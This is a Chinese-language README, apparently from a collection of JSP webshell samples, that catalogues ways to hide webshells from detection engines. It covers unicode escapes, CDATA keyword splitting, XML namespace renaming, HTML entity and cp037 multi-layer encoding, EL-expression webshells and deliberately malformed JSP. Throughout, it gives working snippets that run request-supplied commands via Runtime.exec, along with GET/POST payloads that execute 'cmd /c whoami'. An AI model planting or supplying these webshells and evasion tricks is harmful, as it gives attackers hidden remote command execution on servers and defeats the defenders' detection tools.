# unicode编码绕过
uniocde.jsp
jsp支持unicode编码，如果Webshell检测引擎没有对其进行正确的解码处理，就会被直接“降维打击”，产生绕过
可以跟多个uuuuu达到绕过的效果

# 利用CDATA拆分关键字
CDATA.jsp
这里是要是利用jspx的进行进行免杀，jspx其实就是xml格式的jsp文件
在jspx中，可以利用`<jsp:scriptlet>`来代替`<%%>`
当`<jsp:scriptlet>`被过滤时可以利用EL表达式，达到绕过的效果
```
${Runtime.getRuntime().exec(param.cmd)}
```
利用命令空间改名去绕过，比如demo
```
<demo:root xmlns:bbb="http://java.sun.com/JSP/Page"  version="1.2">
<demo:scriptlet>
Runtime.getRuntime().exec(pageContext.request.getParameter("cmd"));
</demo:scriptlet>
</demo:root>
```
利用`<jsp:expression>`绕过
```
<jsp:root xmlns:bbb="http://java.sun.com/JSP/Page"  version="1.2">
   <jsp:expression>
   Runtime.getRuntime().exec(pageContext.request.getParameter("cmd"));
   </jsp:expression>
</jsp:root>
```
# HTML实体编码
html.jsp
在XML里可以通过html实体编码来对特殊字符转义，jspx同样继承了该特性，由此jspx就具有识别html实体编码
注意：含有CDATA的内容是不能进行html实体编码的，反之html实体编码后的内容也不能插入CDATA，否则无法执行

# cp037编码+多重编码
cp037.jsp encode3.jsp
https://tttang.com/archive/1840/

一重编码的利用的局限性在于文件头只能是utf8格式才能保证代码逻辑的正确执行
找到对应的`UTF-8、UTF-16BE、UTF-16LE、ISO-10646-UCS-4、CP037`作为前置编码

1. 保证无法通过BOM识别出文本内容编码(保证isBomPresent为false)
2. 通过`<?xml encoding='xxx'`可以控制sourceEnc的值
3. 将标签`<jsp:directive.`或`<%@`放置在全文任意位置但不影响代码解析
4. 通过标签`<jsp:directive.`或`<%@的pageEncoding`属性再次更改文本内容编码

# EL webshell
EL.jsp
https://forum.butian.net/share/1880

- 足够小，一句话就可以实现命令执行+回显的功能
- 避免出现<%、Class、eval等敏感字符，具有bypass能力
  
GET传参:
```
?a=getClass&b=forName&c=javax.script.ScriptEngineManager&d=newInstance&e=getEngineByName&f=JavaScript&g=eval
```
POST传参:
```
h=new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "GBK").useDelimiter("\\A").next()
```
# 非主流JSP语法
error.jsp
JSP在第一次运行的时候会先被Web容器，如Tomcat翻译成Java文件，然后才会被Jdk编译成为Class加载到jvm虚拟机中运行
JDK在编译的时候只看java文件的格式是否正确。而Tomcat在翻译JSP的不会检查其是否合乎语法
故意构造出不符合语法规范的JSP样本，来对抗检测引擎的AST分析
可以在启动的 `Using CATALINA_BASE:   "C:\Users\bmth\AppData\Local\JetBrains\IntelliJIdea2020.3\tomcat\b2597b2b-8747-4bc1-9d6d-2f71206906eb"`找到编译好的jsp文件

# unicode的反噬
unicode1~3.jsp为p神的文章

# bfengj
代码来源:https://github.com/bfengj/CTF/blob/main/Web/java/jsp%E5%85%8D%E6%9D%80%E7%BB%95waf/1.jsp
